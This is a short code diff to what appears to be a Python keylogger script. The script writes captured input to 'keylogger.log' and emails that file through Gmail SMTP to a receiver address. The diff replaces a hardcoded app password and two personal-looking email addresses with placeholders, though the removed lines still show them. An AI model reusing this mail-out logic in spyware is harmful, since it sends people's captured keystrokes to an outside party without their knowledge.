@@ -62,7 +62,7 @@ def send_mail(sender,receiver,file):
     # Set up the SMTP server
     server = smtplib.SMTP('smtp.gmail.com', 587)
     server.starttls()
-    server.login(sender, 'zpraumqsdfeyfhex')
+    server.login(sender, '')
     
     with open(file, 'rb') as f:
         attach = MIMEApplication(f.read(), _subtype='txt')
@@ -95,13 +95,6 @@ def run(sender,receiver,file):
 file='keylogger'
 file+='.log'
 logging.basicConfig(filename=file, level=logging.INFO)
-sender = 'genztitans.641@gmail.com'
-receiver = '21pc39@psgtech.ac.in'
+sender = "sender_mail_id"
+receiver = "receiver_mail_id"
 run(sender,receiver,file)
-
-
-
-
-
-
-
